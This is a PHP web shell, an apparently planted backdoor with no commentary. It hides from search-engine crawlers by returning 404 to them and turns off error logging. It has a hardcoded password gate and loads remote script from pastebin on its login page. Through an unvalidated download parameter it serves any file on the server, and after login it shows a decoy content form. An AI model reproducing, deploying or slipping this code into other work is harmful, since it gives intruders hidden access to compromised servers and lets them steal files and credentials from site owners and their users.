<?php
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$auth_pass = "c036b8a26fc84edb0f50e762026ff852"; // default: Muhidayat
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 eror');
        exit;
    }
}

function login_shell() {
?>
<html>
<head>
<script type="text/javascript" src="https://pastebin.com/raw/ynL2hpMe"></script>
<title>Login Mas</title>
<audio autoplay> <source src="http://www.soundjay.com/button/beep-24.wav" type="audio/mpeg"></audio>
<link href="https://fonts.googleapis.com/css?family=Patrick Hand" rel="stylesheet">
<style type="text/css">
html {
	margin: 20px auto;
	background: #110F28;
	color: #FF0000 ;
	text-align: center;
}
input[type=password] {
	width: 400px;
	height: 50px;
	color: springgreen;
	font-size: 30px;
	font-family: Patrick Hand;
	border: 2px solid springgreen;
	border-radius: 10px 25px 10px 25px;
	padding: 5px;
	margin-left: 20px;
	text-align: center;
}
input[type=text] {
	width: 400px;
	height: 50px;
	color: grey;
	font-size: 30px;
	font-family: Patrick Hand;
	border: 2px solid springgreen;
	border-radius: 10px 25px 10px 25px;
	padding: 5px;
	margin-left: 20px;
	text-align: center;
}
input[type=text]:hover {
	background: black;
	width: 400px;
	height: 50px;
	color: grey;
	font-size: 30px;
	font-family: Patrick Hand;
	border: 2px solid springgreen;
	border-radius: 10px 25px 10px 25px;
	padding: 5px;
	margin-left: 20px;
	text-align: center;
}
input[type="submit"] {
	width: 200px;
	background: rgba(0, 0, 0, .7)
	color: grey;
	border-radius: 20px 10px 20px 10px;
	border-color: grey;
	border-width: 2px;
	box-shadow: 10px 10px 5px grey;
	font-size: 30px;
	font-family: Patrick Hand;
	transition: all 2s;
}
input[type="submit"]:hover {
	width: 200px;
	background: rgba(0, 0, 0, .7)
	color: springgreen;
	border-radius: 20px 10px 20px 10px;
	border-color: springgreen;
	border-width: 2px;
	box-shadow: 10px 10px 5px springgreen;
	font-size: 30px;
	font-family: Patrick Hand;
}
input[type="reset"] {
	width: 200px;
	background: rgba(0, 0, 0, .7)
	color: springgreen;
	border-radius: 20px 10px 20px 10px;
	border-color: springgreen;
	border-width: 2px;
	box-shadow: 10px 10px 5px springgreen;
	font-size: 30px;
	font-family: Patrick Hand;
}
</style>
</head>
<center><body>
<img src="https://c.top4top.net/p_11004tbku0.gif" width="500" height="400">
<img src="https://6.top4top.net/p_136712rhv0.png" height="400" width="100%"></center>
<form method="post">
<input type="text" name="user" value="083119229613">
<input type="password" name="pass" placeholder="Hidayat Gans">
<br><br>
<input type="submit" value="Submit">
<input type="reset" value="Reset" href="#" style="margin-left:10px;">
</form><br><br>
<div id="Clock" align="center" style="font-size:50px;font-family:'Patrick Hand';color:white;"></div>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
       $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<html>
<head>
<link href="https://fonts.googleapis.com/css?family=Patrick Hand" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet">
<title>Welcome Hidayat</title>
<style type="text/css">
.content{
	background: springgreen;
	width: 100%;
	height: 400px;
	color: grey;
	font-size: 30px;
	font-family: Patrick Hand;
	border: 5px solid black;
	border-radius: 40px;
	padding: 3px;
	text-indent: 20%;
}
.content:hover{
	background: white;
	width: 100%;
	height: 400px;
	color: grey;
	font-size: 30px;
	font-family: Patrick Hand;
	border: 5px solid black;
	border-radius: 40px;
	padding: 3px;
	text-indent: 20%;
	transition: all 2s;
}
.judul {
	background: springgreen;
	width: 400px;
	height: 70px;
	color: grey;
	font-size: 30px;
	font-family: Patrick Hand;
	border: 5px solid black;
	border-radius: 15px;
	padding: 5px;
	margin-left: 20px;
	text-align: center;
}
.judul:hover {
	background: white;
	width: 400px;
	height: 70px;
	color: grey;
	font-size: 30px;
	font-family: Patrick Hand;
	border: 5px solid black;
	border-radius: 15px;
	padding: 5px;
	margin-left: 20px;
	text-align: center;
	transition: all 2s;
}
input[type="submit"] {
	width: 200px;
	background: rgba(0, 0, 0, .7)
	color: grey;
	border-radius: 20px 10px 20px 10px;
	border-color: grey;
	border-width: 2px;
	box-shadow: 10px 10px 5px grey;
	font-size: 30px;
	font-family: Patrick Hand;
	transition: all 2s;
}
input[type="submit"]:hover {
	width: 200px;
	background: rgba(0, 0, 0, .7)
	color: springgreen;
	border-radius: 20px 10px 20px 10px;
	border-color: springgreen;
	border-width: 2px;
	box-shadow: 10px 10px 5px springgreen;
	font-size: 30px;
	font-family: Patrick Hand;
}
input[type="reset"] {
	width: 200px;
	background: rgba(0, 0, 0, .7)
	color: springgreen;
	border-radius: 20px 10px 20px 10px;
	border-color: springgreen;
	border-width: 2px;
	box-shadow: 10px 10px 5px springgreen;
	font-size: 30px;
	font-family: Patrick Hand;
}
fieldset {
	border-width: 15px;
	border-color: black;
	padding:20px 20px;
	}
legend {
	font-family: Patrick Hand;
	font-size: 55px;
	text-align:center;
	padding: 0px 20px 0px 20px;
	}
.font {
	font-family: Patrick Hand;
	font-size:50px;
	padding: 20px;
	}

</style>
</head>
<body>
<form action="index.html" method="post">
<fieldset>
<legend>Home</legend>
<span class="font">Judul Header : </span><input class="judul" type="text" name="home" placeholder="home"><br><br>
<span class="font">Isi Content :   </span><br><textarea class="content" placeholder="Ini adalah website yang berisi tentang web developer "></textarea>
<br><br>
<center>
<input type="submit" value="Submit">
<input type="reset" value="Reset" style="margin-left:10px;">
</center>
</fieldset>
</form><br><br>
<audio autoplay> <source src="http://www.soundjay.com/button/beep-24.wav" type="audio/mpeg"></audio>
</body>
